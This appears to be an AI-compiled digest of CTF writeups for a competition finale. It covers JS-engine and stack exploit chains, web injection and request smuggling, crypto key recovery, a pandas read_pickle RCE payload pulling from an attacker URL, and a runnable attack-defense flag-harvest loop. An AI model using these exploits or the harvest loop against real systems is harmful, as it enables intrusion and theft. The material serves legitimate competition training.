# AFRICC Technique Digest — for NCTF26 Finale Prep

Built 2026-11-13 from AFRICC (African ICC team) shared CTF writeups + challenge repos.
Source manifest: `workspaces/nctf26-finale/discord-harvest/africc-SOURCES.md`.
AFRICC runs **real attack-defense (A&D) practice** (`ad-2025-dry-run*`, `enowars-9-*`,
`zerodays-*`), which matches the NCTF finale format — so the A&D toolkit section at the
end is the highest-priority takeaway.

> SECURITY: every repo under `downloads/africc/` is UNTRUSTED CTF code. It was READ only —
> never executed, never `pip install`ed. Helper scripts were run with `python3 -I` from a
> separate scratchpad dir, taking the untrusted files as path arguments.

## Sources retrieved vs failed

| Source | Status | Local path / URL |
|---|---|---|
| vaultic-mememaster (rev) | CLONED (full history) | `downloads/africc/vaultic-mememaster/` |
| UMDCTF-2024-Challenges | CLONED (depth 1) | `downloads/africc/UMDCTF-2024-Challenges/` |
| bi0sCTF (2022/2024/2025) | CLONED (depth 1, ~430M) | `downloads/africc/bi0sCTF/` — see bi0sCTF 2022 section |
| literally-1985 (pwn) | FETCHED | github.com/Lobsterge/CTF-Writeups/.../literally-1985 |
| Gambling2 (pwn) | FETCHED | k3sero.github.io/posts/Gambling2-UMDCTF2025/ |
| prime-sponsorship (crypto) | FETCHED | starglow.net/blog/ctf/prime-sponsorship/ |
| A Minecraft Movie (web) | FETCHED | adrianjunge.de/ctf/umdctf/A Minecraft Movie |
| craziest x86 instructions (rev) | FETCHED | hackmd.io/@aplet123/SJuyjwVlxl |
| Steve Le Poisson (web, Notion) | **UNFETCHED** | manifest URL truncated (`booming-lifeboat-071.notion.site/UMDCTF-2025-...`); the partial URL returns an empty Notion shell. Need the full page slug. |

---

## PWN

### literally-1985 — V8 Turbofan typer/constant-folding mismatch (browser pwn)
- Source: github.com/Lobsterge/CTF-Writeups/tree/main/UMDCTF%202025/literally-1985
- Mechanism: a patched `ReduceInt32Add` constant-folds `2+2` to `5`, but the Turbofan typer
  still types it as `4`. Bounds-check elimination trusts the typer, so an index derived from
  that value skips its check → OOB array access.
- Exploit chain: force optimization via a hot loop (OSR, since `v8_optimized_debug=false`
  blocks whole-function opt) → OOB write over an adjacent array's length+elements pointer →
  warm `get_oob`/`set_oob` so Maglev drops their bounds checks → AddrOf/FakeObj → leak heap
  cage base → fake `ArrayBuffer` for 64-bit arbitrary R/W → write shellcode into a
  WebAssembly RWX region and call `instance.exports.func()`.
- Tools: `d8` shell, JS exploit, pwntools-style remote driver (`x.py`).
- Reusable for NCTF: JS-engine pwn is finale-grade; the pattern **"typer says X, folder says
  Y → bounds check removed"** is the reusable bug class. Also the Maglev-accessor trick to
  neutralize bounds checks on helper primitives.

### Gambling2 — stack OOB via `%lf` into an undersized `float[]` (ret2func, 32-bit)
- Source: k3sero.github.io/posts/Gambling2-UMDCTF2025/
- Mechanism: `float f[4]` (16 bytes) but `scanf(" %lf ... %lf", f, f+1 ... f+6)` writes seven
  **8-byte doubles**. `f+4..f+6` land past the array, over `target`, saved EBP, saved EIP.
- Exploit: pack a code address into the high dword of a double (`bits = addr<<32`;
  `struct.pack('<Q')` → `struct.unpack('<d')`), send it as `f+6` (use `float.hex()` literal
  since `%lf` accepts hex floats). `leave;ret` returns into `print_money()` → `system("/bin/sh")`.
- Tools: `objdump` (find `print_money` @ `0x080492c0`), pwntools, `struct`.
- Reusable for NCTF: classic **format/size mismatch → stack overwrite → ret2win**. Fast to
  spot in A&D service source (`scanf` width vs buffer type). The double-encoding-of-an-address
  trick is the memorable bit.

---

## WEB

### A Minecraft Movie — DOM clobbering + CSRF + open-redirect allowlist bypass
- Source: adrianjunge.de/ctf/umdctf/A Minecraft Movie
- Mechanism: app concatenates `window.sessionNumber` **unencoded** into a form body
  (`sessionNumber=${...}&postId=...&likes=...`). HTML injection (DOMPurify 3.2.5 left some
  tags) lets you inject an element whose `id` **clobbers** the global, controlling the body.
- Five independent solve variants worth remembering:
  1. DOM clobbering: `<a href="&likes=10" id="sessionNumber">` → injects an extra `likes` key.
  2. Duplicate-ID form: `<button id="dislike-button" type="submit">` → bot's ID-based click
     submits an attacker CSRF form.
  3. Open-redirect chain: iframe allowlist only permitted `youtube.com/embed/`; abused
     YouTube's `embed/../logout?continue=` + a Google Ads click-tracking redirect to escape
     the allowlist. `SameSite=None` cookie → cross-site POST carries the admin cookie.
  4. CSS overlay clickjacking: hidden `dislike-button` placed under the real like button
     (Puppeteer clicks topmost element at coordinates).
  5. Weak creds (`asdfasdf:asdfasdf`) → log into other accounts, skip the exploit.
- Tools: Burp, DevTools, Puppeteer docs.
- Reusable for NCTF: **DOM clobbering of global mutable state**, **duplicate-ID bot abuse**,
  and **open redirect on a trusted allowlisted domain** are three reusable primitives.
  `SameSite=None` = free CSRF.

### UMDCTF-2024 web/umdproxy — SSRF via an HTTP proxy service (Rust)
- Source: `downloads/africc/UMDCTF-2024-Challenges/web/umdproxy/` (Rust app in `app/src`,
  nginx front). Flag: `UMDCTF{YoU_w1lL_n3Ver_rEaCh_7H3_tRuTh}`.
- Mechanism: a "#1 HTTP proxy" that fetches user-supplied URLs → SSRF to reach internal-only
  endpoints. Read `app/src` for the allowlist/parsing flaw.
- Reusable for NCTF: SSRF-to-internal is a staple of A&D web services; look for
  URL-parsing-vs-fetch discrepancies.

### UMDCTF-2024 web/http-fanatics — HTTP request smuggling (h2/h3 Rust reverse-proxy)
- Source: `downloads/africc/UMDCTF-2024-Challenges/web/http-fanatics/` (Rust reverse-proxy
  `reverse-proxy/src/main.rs` runs HTTP/2 **and** HTTP/3 via `h3`/`hyper`/`httparse`; Python
  backend `app/main.py`). Flag: `UMDCTF{w4tCh_0ut_F0R_RE9u3sT_5mugg1iN9}`.
- Mechanism: desync between the proxy's h2/h3 parsing and the backend's HTTP/1 parsing →
  request smuggling. The custom `httparse`-based forwarding is where the desync lives.
- Reusable for NCTF: **front-end/back-end parser disagreement** is the smuggling root cause;
  review any multi-tier A&D web service for header/length handling mismatches.

---

## CRYPTO

### prime-sponsorship — NTRU key reuse across two moduli → linear-algebra key recovery
- Source: starglow.net/blog/ctf/prime-sponsorship/
- Scheme: toy NTRU in `F_1511[x]/(x^p - x - 1)`, `p ∈ {211,223}`, ternary `f,g`, public
  `h_p = g/(3f)`. Author **reused the same `(f,g)` across both rings**.
- Attack: by CRT the two public keys form one element of a degree-434 ring; the small-`f`,
  small-`g` ratio is recoverable by rational reconstruction, but the writeup does pure linear
  algebra: build multiplication matrices `C_211`, `C_223`, form `D = 3(C_211 - C_223^cut) mod
  1511`, solve `D f = 0` (1-D kernel → `f` up to a unit, confirmed ternary), recover `g`,
  invert `g mod 3` over F_3, decrypt. Flag `UMDCTF{no_logan_paul_here}`.
- Tools: SageMath (poly rings, `GF`, `crt`), PyCryptodome `Crypto.Util.number`.
- Reusable for NCTF: **key/nonce reuse across parameter sets** collapses lattice problems to
  linear algebra. When you see one secret shared between two public keys, try CRT + kernel.

### UMDCTF-2024 crypto/padding-oracle — AES-128-CBC PKCS#7 padding-oracle (reference solver)
- Source: `downloads/africc/UMDCTF-2024-Challenges/crypto/padding-oracle/soln.py` (clean,
  self-contained reference). Flag: `UMDCTF{I_l0vE_p@dINg_0rAClE_@tTacKS}`.
- Mechanism: standard per-byte CBC decryption — for byte `i` brute 0x00..0xff, forge padding
  `i+1`, `check_ct()` oracle confirms valid padding, recover intermediate `I = pad ^ guess`,
  then `P = prev_ct ^ I`. `attack_block(ct1,ct2)` + `attack(iv,ct)` reusable as-is.
- Other crypto challenges in the repo (technique pointers): `haes`/`haes-2`, `triple-des`,
  `giedi-composite`, `key-recovery`.
- Reusable for NCTF: drop-in CBC padding-oracle template; any "valid/invalid padding"
  distinguisher (error, timing, status) is exploitable.

---

## REVERSE

### vaultic-mememaster — secret recovery from deleted git history + PNG tEXt-chunk vault
- Source: `downloads/africc/vaultic-mememaster/` (cloned with FULL history — essential).
- **Primary finding (git-history leak):** commit `3764d76` "Removing accidental uploads"
  deletes `.vaultic/cover.png`, `.vaultic/salt.bin`, `.vaultic/vault.png`, but they persist
  in commit `2850e67`. Recovered with `git show 2850e67:.vaultic/<file>` (no checkout needed).
- **Vault mechanism (confirmed by analysis):**
  - `cover.png` (580981 B) and `vault.png` (581145 B) are the same 999×978 image; `vault.png`
    has one extra **`tEXt` chunk** inserted after IHDR (152 bytes, absent from cover).
  - That tEXt chunk keyword is `vaultic\0` followed by a base64 blob (the encrypted vault):
    `JYP7CDsemNTl/2nKPP0THR3QRtKSnVFluijoFXZmJwT9Nyi4TdUcqpc0xxHjtvVuWhzb2MgtBkvrGDeMU1U6YpM5ORSybj+M1bruH+JIakv0eVmQjA+JIpafq2hj2i38ruBrpeOeTvgFQ==`
  - `salt.bin` = 16 raw bytes (`4931 20f3 1b67 ccd6 b460 7d5c b67e a284`) → KDF salt.
  - Real app source is a git **submodule** `vaultic` → github.com/divpreeet/vaultic.git
    (not vendored here; fetch it to confirm the exact KDF/cipher — pattern is
    password → KDF(salt) → AES-decrypt the tEXt base64 → flag).
- **Decoy:** `solve.py` hides an XOR-obfuscated string (`_viewport_matrix` XOR `0x20`) that
  decodes to `https://www.youtube.com/watch?v=YCVXe5ZmZrs` — a rickroll. Note the
  obfuscation trick (list of ints XOR a constant named innocuously as `_COLOR_DEPTH`).
- Tools: `git log --all --stat`, `git show <commit>:<path>`, `file`, a `-I` Python PNG
  chunk walker, `xxd`.
- Reusable for NCTF: **ALWAYS `git log --all --stat` on any provided repo** and recover
  blobs deleted in later commits; **inspect PNG chunk structure** (ancillary `tEXt`/`zTXt`
  chunks between IHDR and IDAT carry payloads even when file size/dimensions look normal);
  watch for **decoy solve scripts**.

### craziest x86 instructions — exotic SIMD/bit-manip constraint reversing
- Source: hackmd.io/@aplet123/SJuyjwVlxl
- Mechanism: a 64-char flag body split into four 16-byte blocks, each gated by an unusual
  instruction: `vpcmpestrm/vpcmpestri` (printable-ASCII range check via imm `0x54`),
  `vpclmulqdq` (GF(2^128) carryless mul), `pext` (parallel bit extract), `vaddsubps`/
  `vinsertps` (float lanes), `vmpsadbw` (sliding SAD), `vphminposuw` (min word+index),
  `rdseed` (looped until `al==0xe4`, used as a known target byte).
- Techniques: chunk1 LSB-up brute with printable-ASCII pruning (pext/clmul depend on low
  bits); chunks 2&3 Z3 (`fpBVToFP` for floats, `If`-based abs for SAD) + English-word
  guessing to pick among many models; chunk4 rewritten Python→Rust (u64, not bit arrays) for
  speed. Flag `UMDCTF{stop_st0p_STOP!_w3_n33d_t0_g0_B4ck...back_t0_R0cks_in_th3_d3sErt}`.
- Tools: Binary Ninja, Intel SDM, Z3, Python, Rust.
- Reusable for NCTF: **model exotic instruction semantics in Z3** (look each up in the SDM);
  **prune by charset**; **LSB-first brute when the transform is bit-local**; escalate to a
  compiled language when the search space blows Python's memory.

### UMDCTF-2024 rev — technique pointers
- `downloads/africc/UMDCTF-2024-Challenges/rev/`: `cmsc430`, `flavors`, `reality` +
  `reality-revenge`, `travel-the-dunes-with-ocaml`, `typecheck`, `undecidable`. OCaml/typed
  langs and "undecidable"/"typecheck" suggest **type-system / interpreter reversing** —
  relevant if NCTF ships custom-VM or language challenges.

---

## FORENSICS

No standalone forensics writeup was in the manifest, but two cross-over techniques above are
pure forensics and belong in your finale kit:
- **Git-history blob recovery** (vaultic): `git log --all --stat` + `git show <c>:<path>`;
  also `git cat-file`, and for packed/gc'd history `git fsck --lost-found`.
- **PNG chunk carving** (vaultic): walk IHDR→IEND, flag non-standard/ancillary chunks
  (`tEXt`, `zTXt`, `iTXt`, trailing data after IEND). A size delta with identical dimensions
  = hidden chunk, not pixel stego.
- UMDCTF-2024 `misc/` has forensics-adjacent challenges worth mining later:
  `spice-analysis`, `image-abomination`, `echoes-of-arrakis`, `md5`, `possible-futures`.

---

## bi0sCTF 2022 (full challenge sources — `downloads/africc/bi0sCTF/2022/`)

Repo also contains `/2024` and `/2025`; the manifest focus is `/2022`. Categories:
`Pwn {b3typer,k32,kawaii_vm,notes}`, `Web {EmoLocker,Hinty_Note,PyCGI,vuln_drive_2}`,
`Crypto {bad2code,insane-key,LEAKY-DSA,too-ec}`, `Rev {Blue_Lock,Eerie_Jit,lowkeyEnc,Rusted}`,
`Misc {DroidComp,rgb-cheems,snek-game}`. Most ship a `README.md` short-writeup +
`admin/Writeup.md` + exploit — a ready reference library.

### Crypto/LEAKY-DSA — ECDSA partial-nonce leak → bivariate Coppersmith (reusable `small_roots`)
- Source: `.../2022/Crypto/LEAKY-DSA/` (`README.md`, `admin/Writeup.md`). Flag
  `bi0sctf{3CC_S1gn1nG_1s_SECCY_...}`.
- Mechanism: server returns `(z,r,s,k_partial)` for two signatures; private key
  `priv=(s*k - z)*r^-1`. With the top bits of each nonce known and ~120 unknown low bits,
  build a bivariate polynomial `f = (s1*(k1+x)-z1)*r1^-1 - (s2*(k2+y)-z2)*r2^-1` over `Z_q`
  and solve for small roots `x,y` via a Groebner-basis `small_roots` (the writeup includes a
  self-contained Sage `small_roots(f, bounds, m, d)` — copy it).
- Reusable for NCTF: **any partial nonce / biased-`k` ECDSA/DSA** → lattice or bivariate
  small-roots recovery. Keep that `small_roots` helper in the crypto kit.

### Pwn/b3typer — JS-engine typer range bug (pairs with literally-1985)
- Source: `.../2022/Pwn/b3typer/README.md` (+ `admin/`, `handout/`, `deployment/`). Flag
  `bi0s{typ3r_expl01ts_b3_ez_...}`.
- Mechanism: the `BitAnd` opcode's result range is assumed `[1, operand]` but is really
  `[0, operand]` → integer underflow → bypass array bounds check → OOB write → overwrite an
  array's size to overlap a double array with an object array → `addrOf`/`fakeObj` → leak
  StructureID → overlapping fake array → arbitrary R/W.
- Reusable for NCTF: same family as literally-1985 — **a wrong type-range assumption removes a
  bounds check**. The addrOf/fakeObj→arb-R/W ladder is the canonical JS-engine exploit spine.

### Web/PyCGI — pandas `read_pickle` deserialization RCE through a CGI param
- Source: `.../2022/Web/PyCGI/source/src/cgi-bin/search_currency.py` + `exploit/send_exploit.py`.
- Mechanism: `currency_name` is interpolated into a pandas query of shape
  `x'|@pd.read_pickle('<attacker_url>/output.exploit')|'` → `pd.read_pickle` deserializes an
  attacker-hosted pickle → RCE. Exploit hosts a malicious pickle and sends a raw CGI GET with
  `Authorization: Basic ...`. Pulls `bi0sctf{...}` from the response.
- Reusable for NCTF: **`pd.read_pickle`/`pickle.loads` on any attacker-influenced path = RCE**;
  and pandas `@`-eval inside query strings is an injection sink. Grep A&D services for both.

### Web/vuln_drive_2 — SSRF (CRLF in `ini_set`) + WAF header bypass + SQLite column-trick SQLi
- Source: `.../2022/Web/vuln_drive_2/README.md` (+ `Handout`, `admin`).
- Mechanism: SSRF via `file_get_contents()` with CRLF injected through `ini_set()`; bypass the
  WAF with header quirks; then SQLite SQLi using the "column trick" to exfil the flag.
- Reusable for NCTF: **CRLF-driven SSRF** and **SQLite-specific SQLi tricks** (e.g. selecting
  by column/rowid) for A&D web services.

### Web/EmoLocker — XSS/bot challenge
- Source: `.../2022/Web/EmoLocker/` (`bot/`, `source/`, `exploit/`). Client-side/admin-bot
  exploitation (XSS → admin action). Review `exploit/` for the payload shape — relevant to the
  bot-driven web style already seen in "A Minecraft Movie".

### Rev (pointers): `Rusted` (Rust binary RE), `Eerie_Jit` (JIT), `lowkeyEnc` (custom
encryption/keygen), `Blue_Lock`. Pwn (pointers): `kawaii_vm` (custom-VM pwn), `k32`, `notes`
(likely heap). Crypto (pointers): `too-ec` (ECC), `insane-key`, `bad2code`.

---

## ATTACK-DEFENSE  (highest priority — matches the NCTF finale format)

### Lesson captured from AFRICC `ad-2025-dry-run` (! Ax0lotl [OMA], 18/10/2025)
AFRICC's dry-run channel pasted the opening of a **flag harvest + auto-submit loop**: iterate
a per-team target IP range, run one exploit per target, regex the flags out, POST them to the
submit endpoint. Only the opening lines were visible in Discord, so the full template below is
**RECONSTRUCTED from the documented shape — not verbatim source**. It is presented as a
pattern to implement and adapt to the finale's real submit API.

Observed opening (verbatim fragment from the channel):
```python
import requests, re
ips = [f"10.3.{i}.2" for i in range(2, 9)]   # per-team target range
submit_u...                                   # (truncated in Discord)
```

### Reusable A&D exploit-loop template  (RECONSTRUCTED — adapt before use)

```python
#!/usr/bin/env python3
# A&D round harness — RECONSTRUCTED pattern, not verbatim AFRICC source.
# Fill in: exploit(ip), FLAG_RE, SUBMIT_URL, auth/token, and the submit response contract.
import re, time, requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- round config (edit per event) ---
TARGET_IPS   = [f"10.3.{i}.2" for i in range(2, 9)]   # per-team target range (AFRICC shape)
SERVICE_PORT = 9999
SUBMIT_URL   = "http://10.3.1.1/flags"                # finale submit endpoint (replace)
SUBMIT_TOKEN = "YOUR_TEAM_TOKEN"                       # team auth for submission
FLAG_RE      = re.compile(r"[A-Z0-9]{31}=")            # replace with finale flag format, e.g. NCTF{...}
ROUND_SECS   = 60                                      # loop each scoring tick
TIMEOUT      = 8

def exploit(ip: str) -> str:
    """Run the vuln against one target, return raw loot text. READ-only toward targets:
    pull the flag file/endpoint; do not persist a backdoor you must then clean up."""
    # EXAMPLE shape — replace with the round's actual exploit:
    r = requests.get(f"http://{ip}:{SERVICE_PORT}/vuln", timeout=TIMEOUT)
    return r.text

def harvest(ip: str) -> set[str]:
    try:
        return set(FLAG_RE.findall(exploit(ip)))
    except Exception as e:
        print(f"[-] {ip}: {e}")
        return set()

def submit(flags: set[str]) -> None:
    """Flag-submission skeleton. Replace with the finale's real contract (headers/JSON/
    per-flag vs batch, and the accepted/duplicate/own-flag/expired response codes)."""
    if not flags:
        return
    try:
        resp = requests.post(
            SUBMIT_URL,
            headers={"X-Team-Token": SUBMIT_TOKEN},
            json={"flags": sorted(flags)},
            timeout=TIMEOUT,
        )
        print(f"[+] submitted {len(flags)} flags -> {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] submit failed: {e}")

def round_once() -> None:
    all_flags: set[str] = set()
    with ThreadPoolExecutor(max_workers=16) as ex:
        futs = {ex.submit(harvest, ip): ip for ip in TARGET_IPS}
        for fut in as_completed(futs):
            got = fut.result()
            if got:
                print(f"[+] {futs[fut]}: {len(got)} flags")
            all_flags |= got
    submit(all_flags)

if __name__ == "__main__":
    while True:
        t0 = time.time()
        try:
            round_once()
        except Exception as e:
            print(f"[-] round error: {e}")
        dt = ROUND_SECS - (time.time() - t0)
        if dt > 0:
            time.sleep(dt)
```

### A&D toolkit — operating notes for the finale
- **Flag format first:** set `FLAG_RE` to the real finale format before the loop runs; the
  AFRICC fragment used `[A-Z0-9]{31}=` (base64-ish 32 chars) — NCTF jeopardy used `NCTF{...}`,
  so confirm the A&D variant on the scoreboard/checker before harvesting.
- **Submit contract:** learn accepted / duplicate / own-flag / expired / too-old responses so
  you don't burn rate limit resubmitting dupes. De-dupe locally (the `set`), and keep a
  persisted seen-set across rounds.
- **Target range:** AFRICC used `10.3.{i}.2` for `i in 2..8`; the finale will publish its own
  team subnet scheme — parameterize `TARGET_IPS`.
- **Cadence:** align `ROUND_SECS` to the scoring tick; re-exploit every tick because flags
  rotate.
- **House doctrine (per CLAUDE.md `ctf-attack-defense`):** exploit-loop FIRST, patch LATER —
  keep scoring before you touch your own box; patches must be reviewed and must not break the
  SLA checker.
- **Repo infra already present:** `src/tools/ctf/koth_auto.sh`, the attack_defense_toolkit
  validated against saarCTF 2023 (see finale prep docs) — wire this harvest loop into that
  rather than reinventing the submit layer.
- **Don't self-pwn:** skip your own team IP in `TARGET_IPS`; exfil read-only (grab the flag,
  don't plant noisy backdoors you must later clean before the defense phase).

---

## One-line index of local sources
- `downloads/africc/vaultic-mememaster/` — git-history leak + PNG tEXt vault (rev/forensics)
- `downloads/africc/UMDCTF-2024-Challenges/{web,crypto,pwn,rev,misc,osint}/` — full challenge sources
- `downloads/africc/bi0sCTF/{2022,2024,2025}/` — full challenge sources + per-challenge writeups
- Recovered vault blobs (scratch, not in repo): salt.bin / vault.png / cover.png were extracted
  from history for analysis only.
